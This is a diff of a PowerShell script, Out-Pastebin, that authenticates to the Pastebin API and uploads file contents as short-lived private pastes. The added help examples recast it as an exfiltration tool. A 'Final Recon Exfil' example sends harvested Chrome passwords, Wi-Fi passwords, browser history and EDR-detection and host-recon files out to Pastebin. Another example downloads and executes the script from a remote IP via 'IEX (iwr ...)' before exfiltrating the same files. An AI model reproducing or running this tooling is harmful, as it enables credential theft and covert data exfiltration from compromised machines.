@@ -1,7 +1,6 @@
 <# 
 .SYNOPSIS
-    Authenticates to PasteBin.com, and uploads text data directly to the website.
-    Original Script: https://pastebin.com/znW8mkRA
+    Authenticates to PasteBin.com, and uploads text data directly to the website
 .DESCRIPTION
     Uses the PasteBin API to take content from a file and create a new paste from it, including expiration, format, visibility, and title.
 .PARAMETER InputObject
@@ -17,17 +16,24 @@
 .PARAMETER OpenInBrowser
     Open the paste URL in the default browser
 .EXAMPLE
-	Out-Pastebin -InputObject $(Get-Content C:\Users\xxxx\Desktop\to_be_uploaded.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
-.EXAMPLE
-	$list = (Get-Content C:\Users\xxxxx\Desktop\to_be_uploaded.txt)
-	Out-Pastebin -InputObject $list -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
+	Single file:
+	Out-Pastebin -InputObject $(Get-Content C:\Users\Marco\Desktop\to_be_uploaded.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
+
+	Multiple files:
+	Out-Pastebin -InputObject $(Get-Content C:\Users\Marco\Desktop\to_be_uploaded.txt, C:\Users\Marco\Desktop\to_be_uploaded2.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
+	
+	Final Recon Exfil:
+	Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_" -ExpiresIn 10M -Visibility Private
+	
+	powershell.exe IEX (iwr http://172.16.217.130/Out-Pastebin.ps1); Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_" -ExpiresIn 10M -Visibility Private
+
 #>
 
-$PastebinDeveloperKey = 'xxxxxxx'
+$PastebinDeveloperKey = 'xxxxxxxxxx'
 $PastebinPasteURI = 'https://pastebin.com/api/api_post.php'
 $PastebinLoginUri = "https://pastebin.com/api/api_login.php"
-$PastebinUsername = "xxxxx"
-$PastebinPassword = "xxxxx"
+$PastebinUsername = "xxxxxxxx"
+$PastebinPassword = "xxxxxxxx"
 
 $Authenticate = "api_dev_key=$PastebinDeveloperKey&api_user_name=$PastebinUsername&api_user_password=$PastebinPassword"
 
@@ -47,6 +53,7 @@ Function Script:EncodeForPost ( [Hashtable]$KeyValues )
 Function Out-Pastebin
 {
     [CmdletBinding()]
+   
     Param
     (
         [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
@@ -80,10 +87,13 @@ Function Out-Pastebin
     Begin
     {
         Add-Type -AssemblyName System.Web
+
         $script:s = Invoke-RestMethod -Uri $PastebinLoginUri -Body $Authenticate -Method Post
+       
         $Post = [System.Net.HttpWebRequest]::Create( $PastebinPasteURI )
         $Post.Method = "POST"
         $Post.ContentType = "application/x-www-form-urlencoded"
+       
         [String[]]$InputText = @()
     }
    
@@ -102,24 +112,32 @@ Function Out-Pastebin
             api_dev_key    = $PastebinDeveloperKey;
             api_option     = 'paste';
             api_paste_code  = $InputText -join "`r`n";
-            api_paste_name = $PasteTitle;   
+            api_paste_name = $PasteTitle;
+           
             api_paste_private = Switch($Visibility) { Public { '0' }; Unlisted { '1' }; Private { '2' }; };
             api_paste_expire_date = $ExpiresIn.ToUpper();
         }
        
-        If ( $Format ) { $Parameters[ 'api_paste_format' ] = $Format.ToLower() }      
+        If ( $Format ) { $Parameters[ 'api_paste_format' ] = $Format.ToLower() }
+       
         $Content = EncodeForPost $Parameters
+       
         $Post.ContentLength = [System.Text.Encoding]::ASCII.GetByteCount( $Content )
+       
         $WriteStream = New-Object System.IO.StreamWriter ( $Post.GetRequestStream( ), [System.Text.Encoding]::ASCII )
         $WriteStream.Write( $Content )
-        $WriteStream.Close( )      
+        $WriteStream.Close( )
+       
         # Send request, get response
         $Response = $Post.GetResponse( )
         $ReadEncoding = [System.Text.Encoding]::GetEncoding( $Response.CharacterSet )
-        $ReadStream = New-Object System.IO.StreamReader ( $Response.GetResponseStream( ), $ReadEncoding )     
-        $Result = $ReadStream.ReadToEnd().TrimEnd( )  
+        $ReadStream = New-Object System.IO.StreamReader ( $Response.GetResponseStream( ), $ReadEncoding )
+       
+        $Result = $ReadStream.ReadToEnd().TrimEnd( )
+       
         $ReadStream.Close( )
-        $Response.Close( )   
+        $Response.Close( )
+       
         If ( $Result.StartsWith( "http" ) ) {
             If ( $OpenInBrowser ) {
                 Try { Start-Process -FilePath $Result } Catch { }
